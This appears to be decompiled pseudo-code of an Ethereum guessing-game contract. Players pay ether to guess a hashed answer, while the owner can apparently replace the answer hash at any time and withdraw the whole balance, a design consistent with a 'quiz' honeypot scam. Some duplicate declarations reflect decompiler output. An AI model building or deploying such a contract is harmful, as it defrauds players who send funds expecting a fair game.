contract main {




// =====================  Runtime code  =====================


array of uint256 question;
address stor1;
uint256 stor1;
uint256 stor2;
uint256 stor3;

function question() {
    return question[0 len question.length]
}

function _fallback() payable {
  stop
}

function newQuestioner(address arg1) {
    if msg.sender == address(stor1):
        address(stor1) = arg1
}

function NewQuestion(string arg1, bytes32 arg2) payable {
    if msg.sender == address(stor1):
        question[] = Array(len=arg1.length, data=arg1[all])
        stor2 = arg2
}

function StopGame() payable {
    require msg.sender == address(stor1)
    call msg.sender with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function Try(string arg1) payable {
    require tx.origin == msg.sender
    if stor2 == sha3(arg1[all]):
        if msg.value > 2 * 10^18:
            call msg.sender with:
               value eth.balance(this.address) wei
                 gas 2300 * is_zero(value) wei
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
}

function Activate(bytes32 arg1, string arg2, string arg3) payable {
    mem[ceil32(arg2.length) + 160 len arg3.length] = arg3[all]
    mem[ceil32(arg2.length) + ceil32(arg3.length) + 160] = arg1
    if sha3(arg1) == stor3:
        mem[ceil32(arg2.length) + ceil32(arg3.length) + 160 len floor32(arg3.length)] = call.data[arg3 + 36 len floor32(arg3.length)]
        mem[ceil32(arg2.length) + ceil32(arg3.length) + floor32(arg3.length) + 160] = 256^(-(arg3.length % 32) + 32) - 1 and mem[ceil32(arg2.length) + ceil32(arg3.length) + floor32(arg3.length) + 160] or call.data[arg3 + floor32(arg3.length) + 36 len arg3.length % 32], mem[ceil32(arg2.length) + arg3.length + 160 len -(arg3.length % 32) + 32] and !(256^(-(arg3.length % 32) + 32) - 1)
        stor2 = sha3(call.data[arg3 + 36 len floor32(arg3.length)], mem[ceil32(arg2.length) + ceil32(arg3.length) + floor32(arg3.length) + 160 len arg3.length % 32])
        question[] = Array(len=arg2.length, data=arg2[all])
        uint256(stor1) = msg.sender or Mask(96, 160, uint256(stor1))
        stor3 = 0
}



}
